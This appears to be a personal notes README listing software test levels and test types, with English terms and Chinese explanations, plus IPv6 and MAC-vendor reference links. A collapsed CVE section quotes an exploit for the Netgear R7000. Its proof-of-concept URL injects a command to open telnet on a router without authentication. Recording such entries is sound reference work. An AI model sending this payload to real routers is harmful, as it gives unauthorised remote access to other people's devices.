# WorkingSpace

## Test Level

- RAT > FAST > TOFT = Boundary = FET > Volume = Stress
  - Release Acceptance Test(RAT)
  - Functional Acceptance Simple Test(FAST)
  - Force Error Test(FET)
  - Task-Oriented Function Test(TOFT)
  - Boundary Test
  - Volume Test
  - Stress Test

```text
Unit Test                   單元測試-在最基本的功能/參數上驗證程序的正確性
Functional Test             功能測試-驗證模塊的功能
Integration Test            集成測試-驗證幾個互相有依賴關係的模塊的功能
Scenario Test               場景測試-驗證幾個模塊能否完成一個用戶場景
System Test                 系統測試-對於整個系統功能的測試
Beta Test                   外部軟件測試人員在實際用戶環境中對軟件進行全面的測試
Stress/Load Test            壓力測試-測試軟件在負載情況下能否正常工作
Performance Test            性能測試-測試軟件的效能
Accessibility Test          可訪問性測試-測試軟件是否向殘疾用戶提供了足夠的輔助功能
L10N/G11N Test              本地化/全球化測試
Compatibility Test          兼容性測試
Configuration Test          配置測試-測試軟件在各種配置下能否正常工作
Usability Test              易用性測試-測試軟件是否好用
Security Test               軟件安全性測試
Smoke Test                  冒煙測試-測試不通過,則不能進一下步工作
Build Verification Test     驗證構建是否通過基本測試
Acceptance Test             驗收測試-全面考核某方面的功能/特性
Regression Test             回歸測試-對一個新的版本,重新運行以往的測試用例,確認新版本比已知版本有無退化(regression)
Ad hoc(Exploratory) Test    隨機進行的,探索性的測試
Bug Bash                    Bug大掃除-全體成員參加的找"小強"活動
Buddy Test                  夥伴測試-開發人員(夥伴)作為測試人員測試特定模塊
```

## Common Vulnerabilities and Exposures

<details><summary>CVE</summary>

```text
# Exploit Title: Netgear R7000 - Command Injection
# Date: 6-12-2016
# Exploit Author: Acew0rm
# Contact: https://twitter.com/Acew0rm1
# Vendor Homepage: https://www.netgear.com/
# Category: Hardware
# Version: V1.0.7.2_1.1.93

- Vulnerability     An unauthenticated user can inject commands threw http://RouterIP/cgi-bin/;COMMAND.
- Proof Of Concept  http://RouterIP/;telnetd$IFS-p$IFS'45' will open telnet on port 45.
```

</details>

## [MAC Vendor List](https://gist.github.com/aallan/b4bb86db86079509e6159810ae9bd3e4)

## IPv6

- [Linux IPv6 HOWTO](https://tldp.org/HOWTO/Linux+IPv6-HOWTO/)
- [GetIPv6.Info - ARIN's IPv6 Wiki](https://www.arin.net/vault/knowledge/getipv6_info.html)
